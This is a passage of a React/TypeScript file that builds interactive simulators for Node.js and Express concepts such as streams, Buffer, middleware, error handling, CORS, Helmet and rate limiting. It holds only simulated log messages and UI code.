      setRamUsage(0);

      if (streamMode) {
        // Stream mode - memory rises very slightly then processes chunks
        setTimeout(() => { setRamUsage(5); addLog("Streaming chunk 1 of 5 (100MB)..."); }, 400);
        setTimeout(() => { setRamUsage(8); addLog("Streaming chunk 2 of 5 (100MB)..."); }, 800);
        setTimeout(() => { setRamUsage(6); addLog("Streaming chunk 3 of 5 (100MB)..."); }, 1200);
        setTimeout(() => { setRamUsage(7); addLog("Streaming chunk 4 of 5 (100MB)..."); }, 1600);
        setTimeout(() => { setRamUsage(5); addLog("Streaming chunk 5 of 5 (100MB)..."); }, 2000);
        setTimeout(() => { setRamUsage(0); addLog("Upload successfully completed. Memory usage stayed low & safe!"); }, 2400);
      } else {
        // Buffer mode - loading entire file into memory instantly
        setTimeout(() => { 
          setRamUsage(95); 
          addLog("WARNING: Reading complete 500MB block directly into RAM Buffer...");
        }, 500);
        setTimeout(() => { 
          addLog("CRITICAL ERROR: Node Process Out-of-Memory heap limit reached!");
          addLog("Process terminated. (Signal SIGABRT)");
        }, 1500);
      }
    };

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-3">
          <button
            onClick={() => setStreamMode(true)}
            className={`p-3 rounded-lg border text-left ${streamMode ? "border-emerald-500 bg-emerald-950/20" : "border-slate-800 bg-slate-900"}`}
          >
            <h5 className="text-xs font-bold">Pipeline Streaming</h5>
            <p className="text-[10px] text-slate-500 mt-1">Chunk-by-chunk flow. Ultra efficient.</p>
          </button>
          <button
            onClick={() => setStreamMode(false)}
            className={`p-3 rounded-lg border text-left ${!streamMode ? "border-rose-500 bg-rose-950/20" : "border-slate-800 bg-slate-900"}`}
          >
            <h5 className="text-xs font-bold">Standard Buffering</h5>
            <p className="text-[10px] text-slate-500 mt-1">Loads whole payload in RAM heap before processing.</p>
          </button>
        </div>

        <div className="p-3 rounded-lg border border-slate-800 bg-slate-900 space-y-2">
          <div className="flex justify-between items-center text-xs">
            <span>Server Memory (RAM) Consumption:</span>
            <span className={ramUsage > 80 ? "text-rose-400 font-bold" : "text-slate-300"}>{ramUsage}%</span>
          </div>
          <div className="w-full bg-slate-950 rounded-full h-4 overflow-hidden border border-slate-800">
            <div className={`h-full transition-all duration-300 ${ramUsage > 80 ? "bg-rose-600" : "bg-emerald-500"}`} style={{ width: `${ramUsage}%` }}></div>
          </div>
        </div>

        <button onClick={triggerUpload} className="w-full bg-slate-950 hover:bg-slate-900 border border-slate-800 text-xs py-2 rounded">
          Simulate File Upload Handler
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 13. What are the four types of Node streams?
  const Simulator13 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [activeStreamType, setActiveStreamType] = useState("Readable");

    const descriptions = {
      Readable: "Source of data stream. Examples: fs.createReadStream(), process.stdin. Emits 'data' and 'end' events.",
      Writable: "Sink target to output files. Examples: fs.createWriteStream(), process.stdout. Handled via write() and end().",
      Duplex: "Bi-directional. Allows simultaneous reading and writing operations independently. Example: net.Socket.",
      Transform: "Special Duplex. Modifies/converts the raw data byte content while it is being piped. Example: zlib.createGzip()."
    };

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-4 gap-1.5">
          {Object.keys(descriptions).map((t) => (
            <button
              key={t}
              onClick={() => setActiveStreamType(t)}
              className={`py-1.5 text-[10px] font-bold rounded border transition-all ${activeStreamType === t ? "bg-cyan-950 text-cyan-300 border-cyan-500" : "bg-slate-900 border-slate-800 text-slate-400"}`}
            >
              {t}
            </button>
          ))}
        </div>

        <div className="p-3 rounded-lg border border-slate-800 bg-slate-900 text-xs leading-5">
          <strong className="text-cyan-400">{activeStreamType} Stream:</strong>
          <p className="text-slate-300 mt-1">{descriptions[activeStreamType as keyof typeof descriptions]}</p>
        </div>

        <button
          onClick={() => {
            clearLogs();
            addLog(`Simulating streaming pipeline mapping...`);
            addLog(`[ReadStream File] --(Piped Chunks)--> [GZIP Compress (Transform)] --(Piped Gzipped)--> [WriteStream File]`);
            setTimeout(() => addLog("Streaming started..."), 500);
            setTimeout(() => addLog("Chunk 'hello' compressed -> 'H4sIC...' -> written to disk."), 1200);
            setTimeout(() => addLog("Pipeline finished cleanly."), 2000);
          }}
          className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded"
        >
          Animate Transform Pipeline
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 14. What is Buffer in Node.js?
  const Simulator14 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [text, setText] = useState("Node");

    // Convert string to hex and binary representations
    const chars = text.split("");
    
    return (
      <div className="space-y-4">
        <div>
          <label className="text-[11px] text-slate-400 block mb-1">Type raw characters to visualize memory allocation:</label>
          <input
            type="text"
            value={text}
            maxLength={10}
            onChange={(e) => {
              setText(e.target.value);
              addLog(`Buffer reallocated. Allocated size: ${e.target.value.length} bytes.`);
            }}
            className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs font-mono text-emerald-400 focus:outline-none focus:border-emerald-500"
          />
        </div>

        <div className="grid grid-cols-4 gap-2">
          {chars.map((char, index) => {
            const code = char.charCodeAt(0);
            const hex = code.toString(16).toUpperCase();
            const bin = code.toString(2).padStart(8, "0");
            return (
              <div key={index} className="p-2 bg-slate-900 border border-slate-800 rounded text-center space-y-1">
                <span className="text-xs font-bold text-slate-300">Char: '{char}'</span>
                <div className="text-[10px] text-emerald-400 font-mono">Hex: 0x{hex}</div>
                <div className="text-[10px] text-cyan-400 font-mono">Dec: {code}</div>
                <div className="text-[9px] text-slate-500 font-mono">{bin}</div>
              </div>
            );
          })}
          {chars.length === 0 && (
            <div className="col-span-4 text-center py-4 text-slate-500 text-xs">Buffer is empty. Allocation: 0 bytes.</div>
          )}
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 15. What is Express.js?
  const Simulator15 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="border border-slate-800 bg-slate-900 rounded-lg p-3 relative overflow-hidden">
          <div className="flex justify-between items-center text-xs mb-3">
            <span className="font-semibold text-slate-200">Express Lifecycle Diagram</span>
            <span className="text-[10px] text-emerald-400 font-mono">Port 3000</span>
          </div>
          <div className="flex justify-between items-center text-[10px] text-center gap-1.5">
            <div className="p-2 rounded bg-slate-950 border border-slate-800 w-20">
              <span className="text-cyan-400 block font-bold font-mono">CLIENT</span>
              Browser Req
            </div>
            <div className="text-slate-500">&rarr;</div>
            <div className="p-2 rounded bg-slate-950 border border-slate-800 w-20">
              <span className="text-cyan-400 block font-bold font-mono">APP ROUTER</span>
              Match path
            </div>
            <div className="text-slate-500">&rarr;</div>
            <div className="p-2 rounded bg-slate-950 border border-slate-800 w-24">
              <span className="text-cyan-400 block font-bold font-mono">CONTROLLER</span>
              Logic / DB fetch
            </div>
            <div className="text-slate-500">&rarr;</div>
            <div className="p-2 rounded bg-slate-950 border border-slate-800 w-20">
              <span className="text-emerald-400 block font-bold font-mono">RESPONSE</span>
              JSON object
            </div>
          </div>
        </div>

        <button
          onClick={() => {
            clearLogs();
            addLog("Client: GET /api/v1/users/42");
            setTimeout(() => addLog("Express Router: matched pattern /api/v1/users/:id"), 400);
            setTimeout(() => addLog("Controller: checking user model inside memory database..."), 1000);
            setTimeout(() => addLog("Response sent: Status 200 OK. Body: { id: 42, name: 'Alice' }"), 1600);
          }}
          className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium text-xs py-2 rounded"
        >
          Animate API Handshake
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 16. What is middleware in Express?
  const Simulator16 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [authActive, setAuthActive] = useState(true);

    const sendRequest = () => {
      clearLogs();
      addLog("Sending GET /dashboard...");
      addLog("[Middleware 1 - Logger]: GET request to /dashboard at " + new Date().toLocaleTimeString());
      
      setTimeout(() => {
        addLog("[Middleware 2 - AuthGuard]: Validating authorization token headers...");
        if (authActive) {
          addLog("[Middleware 2 - AuthGuard]: Token verified successfully. Calling next().");
          
          setTimeout(() => {
            addLog("[Controller]: Access granted. Database profile payload returned.");
            addLog("Response Status: 200 OK");
          }, 800);
        } else {
          addLog("[Middleware 2 - AuthGuard]: Authorization header is missing!");
          addLog("[Middleware 2 - AuthGuard]: Terminating request early. Sent response 401 Unauthorized.");
          addLog("Request aborted. Bypassed actual controller handler.");
        }
      }, 1000);
    };

    return (
      <div className="space-y-4">
        <div className="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
          <span className="text-xs font-semibold">Include Authorization Token Header:</span>
          <button
            onClick={() => setAuthActive(!authActive)}
            className={`px-3 py-1.5 rounded-md text-xs font-semibold ${authActive ? "bg-emerald-600 text-white" : "bg-rose-950 border border-rose-800 text-rose-300"}`}
          >
            {authActive ? "Token Present (Valid)" : "No Token (Invalid)"}
          </button>
        </div>

        <button onClick={sendRequest} className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded">
          Send Simulated Request
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 17. What does calling next() in middleware do?
  const Simulator17 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [callNext, setCallNext] = useState(true);

    const triggerRequest = () => {
      clearLogs();
      addLog("Client: initiating API Request to /fetch-data...");
      addLog("Entering Middleware 1 (IP Logger)... calling next()");
      
      setTimeout(() => {
        addLog("Entering Middleware 2 (Telemetry Collector)...");
        if (callNext) {
          addLog("Middleware 2: Calling next(). Control moves forward.");
          setTimeout(() => {
            addLog("Entering main route handler -> Returning user profiles.");
            addLog("Success: Response sent back to browser client!");
          }, 1000);
        } else {
          addLog("WARNING: Middleware 2 finished but DID NOT call next() and did not send response.");
          addLog("Client connection state: HANGING... awaiting response byte stream.");
          setTimeout(() => {
            addLog("Client: Request timed out after 30 seconds of inactivity!");
          }, 2500);
        }
      }, 1000);
    };

    return (
      <div className="space-y-4">
        <div className="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
          <span className="text-xs font-semibold">Middleware 2 invokes next() function:</span>
          <button
            onClick={() => setCallNext(!callNext)}
            className={`px-3 py-1.5 rounded-md text-xs font-semibold ${callNext ? "bg-emerald-600 text-white" : "bg-rose-950 border border-rose-800 text-rose-300"}`}
          >
            {callNext ? "Yes (Proper flow)" : "No (Stalls flow)"}
          </button>
        </div>

        <button onClick={triggerRequest} className="w-full bg-slate-950 hover:bg-slate-900 border border-slate-800 text-xs py-2 rounded">
          Animate Processing Chain
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 18. What is next(err) used for?
  const Simulator18 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const triggerNormalOrError = (isError: boolean) => {
      clearLogs();
      addLog("Client initiated query: GET /payment/checkout");
      addLog("Entering Logger Middleware...");
      
      setTimeout(() => {
        addLog("Entering Payment Validator Middleware...");
        if (isError) {
          addLog("Payment Validator: Credit card validation rejected! Insufficient funds.");
          addLog("Validator: Calling next(new Error('Declined_Transaction')) -> Jumping normal routes.");
          
          setTimeout(() => {
            addLog("--- BYPASSED NORMAL MIDDLEWARES & ROUTERS ---");
            addLog("Entering Central Error-Handling Middleware (4 arguments)...");
            addLog("Central Handler: Formatting neat JSON crash payload, logging to error tracker, and sending Status 400.");
          }, 1200);
        } else {
          addLog("Payment Validator: Card verified. Calling next().");
          setTimeout(() => {
            addLog("Entering Normal Route Handler...");
            addLog("Receipt printed! Transaction successfully finished.");
          }, 1200);
        }
      }, 1000);
    };

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-3">
          <button onClick={() => triggerNormalOrError(false)} className="bg-emerald-950/40 hover:bg-emerald-900/60 border border-emerald-800 text-emerald-300 text-xs py-2 px-3 rounded-lg font-semibold">
            Success Route (next())
          </button>
          <button onClick={() => triggerNormalOrError(true)} className="bg-rose-950/40 hover:bg-rose-900/60 border border-rose-800 text-rose-300 text-xs py-2 px-3 rounded-lg font-semibold">
            Error Route (next(err))
          </button>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 19. How do you define an error-handling middleware in Express?
  const Simulator19 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="bg-slate-900 border border-slate-800 p-3 rounded-lg">
          <h4 className="text-xs font-bold text-slate-300 mb-2">Parameter-Count Signatures</h4>
          <div className="space-y-2 text-[11px] font-mono">
            <div className="p-2 bg-slate-950 border-l-4 border-slate-600 rounded">
              <span className="text-slate-400">app.use((req, res, next) =&gt; &#123; ... &#125;)</span>
              <div className="text-[10px] text-slate-500 mt-1">3 arguments = Normal Middleware. Passes requests.</div>
            </div>
            <div className="p-2 bg-slate-950 border-l-4 border-rose-500 rounded">
              <span className="text-rose-400">app.use((err, req, res, next) =&gt; &#123; ... &#125;)</span>
              <div className="text-[10px] text-slate-500 mt-1">4 arguments = Error-handling Middleware. Express detects length === 4 via JS reflection, redirecting next(err) here!</div>
            </div>
          </div>
        </div>

        <button
          onClick={() => {
            clearLogs();
            addLog("Express Framework parsing initial middlewares...");
            addLog("Analyzing user function: (req, res, next) -> Parameter length detected: 3. Registered as normal router hook.");
            addLog("Analyzing central function: (err, req, res, next) -> Parameter length: 4. Registered as active Error Handler!");
          }}
          className="w-full bg-slate-950 hover:bg-slate-900 border border-slate-800 text-xs py-2 rounded"
        >
          Simulate Express Route Assembly
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 20. Route parameters vs Query parameters
  const Simulator20 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [pathId, setPathId] = useState("42");
    const [queryVal, setQueryVal] = useState("asc");

    return (
      <div className="space-y-4">
        <div className="space-y-3">
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-[10px] text-slate-400 block mb-1">Path parameter (:id)</label>
              <input
                type="text"
                value={pathId}
                onChange={(e) => setPathId(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded p-1.5 text-xs text-cyan-400 font-mono"
              />
            </div>
            <div>
              <label className="text-[10px] text-slate-400 block mb-1">Query parameter (?sort=)</label>
              <input
                type="text"
                value={queryVal}
                onChange={(e) => setQueryVal(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded p-1.5 text-xs text-cyan-400 font-mono"
              />
            </div>
          </div>

          <div className="bg-slate-950 p-2.5 rounded-lg border border-slate-800 font-mono text-xs text-slate-300">
            <span className="text-slate-500">URL Address: </span>
            <span>http://localhost:3000/users/</span>
            <span className="text-cyan-400 font-bold">{pathId || "id"}</span>
            <span>?sort=</span>
            <span className="text-cyan-400 font-bold">{queryVal || "desc"}</span>
          </div>

          <div className="grid grid-cols-2 gap-3 font-mono text-xs">
            <div className="p-2 bg-slate-900 border border-slate-800 rounded">
              <span className="text-cyan-400 block font-bold">req.params</span>
              <pre className="text-[10px] mt-1">{JSON.stringify({ id: pathId }, null, 2)}</pre>
            </div>
            <div className="p-2 bg-slate-900 border border-slate-800 rounded">
              <span className="text-cyan-400 block font-bold">req.query</span>
              <pre className="text-[10px] mt-1">{JSON.stringify({ sort: queryVal }, null, 2)}</pre>
            </div>
          </div>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 21. How do you access route params, query params, and body in Express?
  const Simulator21 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [bodyName, setBodyName] = useState("Jane Doe");
    
    return (
      <div className="space-y-4">
        <div>
          <label className="text-[10px] text-slate-400 block mb-1">JSON Payload Body {"{ name: ... }"}</label>
          <input
            type="text"
            value={bodyName}
            onChange={(e) => setBodyName(e.target.value)}
            className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs font-mono text-cyan-400 focus:outline-none"
          />
        </div>

        <button
          onClick={() => {
            clearLogs();
            addLog("Executing POST /users/42?role=admin");
            addLog("Express Parser parsed incoming request properties:");
            addLog(`req.params => { id: '42' } (Extracted from path template /users/:id)`);
            addLog(`req.query  => { role: 'admin' } (Parsed from search parameters)`);
            addLog(`req.body   => { name: '${bodyName}' } (Parsed from json payload headers)`);
          }}
          className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded"
        >
          Run Request Body Parser
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 22. What is express.json() middleware for?
  const Simulator22 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [middlewareActive, setMiddlewareActive] = useState(true);

    const handlePostRequest = () => {
      clearLogs();
      addLog("Sending POST /users with raw payload '{\"username\": \"john\"}'...");
      addLog("Header Content-Type: application/json detected.");

      setTimeout(() => {
        if (middlewareActive) {
          addLog("Running express.json() middleware...");
          addLog("Raw bytes parsed. req.body is successfully populated as an object!");
          addLog("STDOUT User details: Username value is 'john'. Response code 201.");
        } else {
          addLog("Bypassing JSON parsing middlewares...");
          addLog("STDOUT: Cannot read properties of undefined (reading 'username')");
          addLog("Error: req.body remained undefined due to omission of express.json().");
        }
      }, 1000);
    };

    return (
      <div className="space-y-4">
        <div className="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
          <span className="text-xs font-semibold">express.json() status:</span>
          <button
            onClick={() => setMiddlewareActive(!middlewareActive)}
            className={`px-3 py-1.5 rounded-md text-xs font-semibold ${middlewareActive ? "bg-emerald-600 text-white" : "bg-rose-950 border border-rose-800 text-rose-300"}`}
          >
            {middlewareActive ? "Active" : "Disabled (req.body undefined)"}
          </button>
        </div>

        <button onClick={handlePostRequest} className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded">
          Send Payload
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 23. How do you handle CORS in Express?
  const Simulator23 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [allowedOrigin, setAllowedOrigin] = useState("http://trustedapp.com");
    const [requestOrigin, setRequestOrigin] = useState("http://malicious.com");

    const fireRequest = () => {
      clearLogs();
      addLog(`Browser triggers request from origin: ${requestOrigin}`);
      addLog("Browser: sending Pre-flight OPTIONS request...");
      
      setTimeout(() => {
        const matches = allowedOrigin === "*" || allowedOrigin === requestOrigin;
        addLog(`Server: Allowed-Origin Header configured for: ${allowedOrigin}`);
        
        if (matches) {
          addLog("Success: Access-Control-Allow-Origin header verified. Browser releases response payload!");
          addLog("Status: 200 SUCCESS");
        } else {
          addLog("CRITICAL CORS BLOCKED: Browser caught a mismatch! Server response headers did not include requester domain.");
          addLog("Browser threw console error: CORS block policy failure. Restricting client data access.");
        }
      }, 1000);
    };

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-3">
          <div>
            <label className="text-[10px] text-slate-400 block mb-1">Server Allowed Domain:</label>
            <select
              value={allowedOrigin}
              onChange={(e) => setAllowedOrigin(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 rounded p-1.5 text-xs text-slate-300 focus:outline-none"
            >
              <option value="http://trustedapp.com">http://trustedapp.com</option>
              <option value="*">* (Allow All - Dangerous)</option>
            </select>
          </div>
          <div>
            <label className="text-[10px] text-slate-400 block mb-1">Requester Browser Domain:</label>
            <select
              value={requestOrigin}
              onChange={(e) => setRequestOrigin(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 rounded p-1.5 text-xs text-slate-300 focus:outline-none"
            >
              <option value="http://trustedapp.com">http://trustedapp.com</option>
              <option value="http://malicious.com">http://malicious.com</option>
            </select>
          </div>
        </div>

        <button onClick={fireRequest} className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded">
          Simulate Browser API Request
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 24. What is the purpose of a router (express.Router())?
  const Simulator24 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg">
          <h4 className="text-xs font-bold text-slate-300 mb-2">Modular Routes Mounting Tree</h4>
          <div className="space-y-1.5 font-mono text-[10px] leading-5">
            <div>server.js <span className="text-slate-500">&rarr; app.use('/users', userRouter)</span></div>
            <div className="pl-6 text-slate-400">userRouter.js <span className="text-cyan-400">&rarr; router.get('/profile')</span> matches <span className="text-emerald-400">GET /users/profile</span></div>
            <div className="pl-6 text-slate-400">userRouter.js <span className="text-cyan-400">&rarr; router.get('/settings')</span> matches <span className="text-emerald-400">GET /users/settings</span></div>
            <div className="mt-2">server.js <span className="text-slate-500">&rarr; app.use('/products', productRouter)</span></div>
            <div className="pl-6 text-slate-400">productRouter.js <span className="text-cyan-400">&rarr; router.get('/list')</span> matches <span className="text-emerald-400">GET /products/list</span></div>
          </div>
        </div>

        <button
          onClick={() => {
            clearLogs();
            addLog("Simulating modular routers indexing...");
            addLog("Loaded separate sub-route files for /users, /products, and /billing.");
            addLog("Sub-routes mounted under distinct prefix domains successfully.");
          }}
          className="w-full bg-slate-950 hover:bg-slate-900 border border-slate-800 text-xs py-2 rounded"
        >
          Check Namespace Mappings
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 25. How would you structure a larger Express application?
  const Simulator25 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [selectedFolder, setSelectedFolder] = useState<string | null>(null);

    const folderInfo = {
      routes: "Handles URL endpoints maps and middleware injections only. Delegates actual actions to controllers.",
      controllers: "Houses all logical computations, authentication, and responses. Directly interacts with model files.",
      models: "Declares database schemas, pools configurations, indexes, and custom queries (SQL/MongoDB setups).",
      middlewares: "Central storage for reusable guards like auth logs, validation checks, and CORS handlers."
    };

    return (
      <div className="space-y-4">
        <div className="bg-slate-950 p-3 rounded-lg border border-slate-800 text-xs font-mono">
          <div className="text-slate-500">my-express-app /</div>
          <div className="pl-3 hover:bg-slate-900 cursor-pointer rounded py-0.5" onClick={() => setSelectedFolder("routes")}>📁 routes/ <span className="text-[10px] text-slate-600">// click to inspect</span></div>
          <div className="pl-3 hover:bg-slate-900 cursor-pointer rounded py-0.5" onClick={() => setSelectedFolder("controllers")}>📁 controllers/</div>
          <div className="pl-3 hover:bg-slate-900 cursor-pointer rounded py-0.5" onClick={() => setSelectedFolder("models")}>📁 models/</div>
          <div className="pl-3 hover:bg-slate-900 cursor-pointer rounded py-0.5" onClick={() => setSelectedFolder("middlewares")}>📁 middlewares/</div>
          <div className="pl-3">📄 server.js</div>
        </div>

        {selectedFolder && (
          <div className="p-3 rounded-lg border border-teal-900 bg-teal-950/20 text-xs text-teal-200 leading-5">
            <strong>Folder /{selectedFolder}:</strong> {folderInfo[selectedFolder as keyof typeof folderInfo]}
          </div>
        )}
        {renderTerminal()}
      </div>
    );
  };

  // 26. What is the MVC pattern?
  const Simulator26 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg text-center relative">
          <h4 className="text-xs font-semibold text-slate-300 mb-2">MVC Triad Cycle</h4>
          <div className="grid grid-cols-3 gap-2 font-mono text-[10px] mt-2">
            <div className="p-2 rounded border border-cyan-800 bg-cyan-950/20">
              <span className="font-bold text-cyan-400 block">MODEL</span>
              Db Client queries
            </div>
            <div className="p-2 rounded border border-cyan-800 bg-cyan-950/20">
              <span className="font-bold text-cyan-400 block">CONTROLLER</span>
              Logic director
            </div>
            <div className="p-2 rounded border border-cyan-800 bg-cyan-950/20">
              <span className="font-bold text-cyan-400 block">VIEW</span>
              Rendered output
            </div>
          </div>
        </div>

        <button
          onClick={() => {
            clearLogs();
            addLog("Event: Router passes control to Controller.");
            setTimeout(() => addLog("Controller: Requests user fields from User Model..."), 500);
            setTimeout(() => addLog("Model: Fetches data via DB queries..."), 1000);
            setTimeout(() => addLog("Controller: Binds fields to the JSON View output!"), 1500);
          }}
          className="w-full bg-slate-950 hover:bg-slate-900 border border-slate-800 text-xs py-2 rounded"
        >
          Animate MVC Circle
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 27. How do you handle async errors in Express route handlers?
  const Simulator27 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [wrapError, setWrapError] = useState(true);

    const triggerAsyncRequest = () => {
      clearLogs();
      addLog("Sending API query GET /async-data...");
      addLog("Query handler running: connecting to remote database client...");

      setTimeout(() => {
        if (wrapError) {
          addLog("Simulator: Database connection timed out!");
          addLog("Simulator: Caught exception via try/catch wrapper -> next(err) invoked.");
          
          setTimeout(() => {
            addLog("Central error handler took over. Retuned Status 500 gracefully.");
          }, 800);
        } else {
          addLog("Simulator: Database connection timed out!");
          addLog("CRITICAL: UnhandledPromiseRejection warning thrown to Node console.");
          addLog("Server status: Process stuck in unhandled crash state. Request stalled.");
        }
      }, 1000);
    };

    return (
      <div className="space-y-4">
        <div className="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
          <span className="text-xs font-semibold">Wrap Async code with Try/Catch handler:</span>
          <button
            onClick={() => setWrapError(!wrapError)}
            className={`px-3 py-1.5 rounded-md text-xs font-semibold ${wrapError ? "bg-emerald-600 text-white" : "bg-rose-950 border border-rose-800 text-rose-300"}`}
          >
            {wrapError ? "True (Wrapped safe)" : "False (Vulnerable crash)"}
          </button>
        </div>

        <button onClick={triggerAsyncRequest} className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded">
          Fire Async Operation
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 28. What is a common security middleware? (Helmet)
  const Simulator28 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [helmetActive, setHelmetActive] = useState(true);

    const headersList = [
      { key: "Content-Security-Policy", value: "default-src 'self'", helmetOnly: true },
      { key: "X-Frame-Options", value: "SAMEORIGIN", helmetOnly: true },
      { key: "X-Content-Type-Options", value: "nosniff", helmetOnly: true },
      { key: "X-Powered-By", value: "Express (Reveals technology)", helmetOnly: false }
    ];

    return (
      <div className="space-y-4">
        <div className="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
          <span className="text-xs font-semibold">Helmet Active status:</span>
          <button
            onClick={() => setHelmetActive(!helmetActive)}
            className={`px-3 py-1.5 rounded-md text-xs font-semibold ${helmetActive ? "bg-emerald-600 text-white" : "bg-rose-950 border border-rose-800 text-rose-300"}`}
          >
            {helmetActive ? "Helmet On (Secure)" : "Helmet Off (Vulnerable)"}
          </button>
        </div>

        <div className="border border-slate-800 rounded-lg overflow-hidden text-xs">
          <div className="bg-slate-900 px-3 py-1.5 font-bold border-b border-slate-800 text-slate-300">
            HTTP Response Headers
          </div>
          <div className="divide-y divide-slate-900 font-mono text-[10px]">
            {headersList.map((h, i) => {
              const active = helmetActive ? (h.helmetOnly || h.key !== "X-Powered-By") : (!h.helmetOnly);
              return (
                <div key={i} className={`p-2 flex justify-between ${active ? "bg-slate-950 text-slate-300" : "bg-rose-950/20 text-slate-600 line-through"}`}>
                  <span>{h.key}:</span>
                  <span>{active ? h.value : "[OMITTED / HIDDEN]"}</span>
                </div>
              );
            })}
          </div>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 29. Rate Limiting in Express
  const Simulator29 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [reqs, setReqs] = useState<number[]>([]);
    const LIMIT = 5;

    const clickSpam = () => {
      const now = Date.now();
      const nextReqs = [...reqs, now].filter((t) => now - t < 5000); // Filter past 5 seconds
      setReqs(nextReqs);

      clearLogs();
      addLog(`Request fired from IP 192.168.1.1. Count in last 5s: ${nextReqs.length}`);

      if (nextReqs.length > LIMIT) {
        addLog("CRITICAL: Rate limit surpassed! Returning HTTP 429: Too Many Requests.");
      } else {
        addLog("Success: Route processed normally. 200 OK");
      }
    };

    return (
      <div className="space-y-4">
        <div className="p-3 rounded-lg border border-slate-800 bg-slate-900 flex justify-between items-center text-xs">
          <span>Usage Meter (Max 5 in 5s):</span>
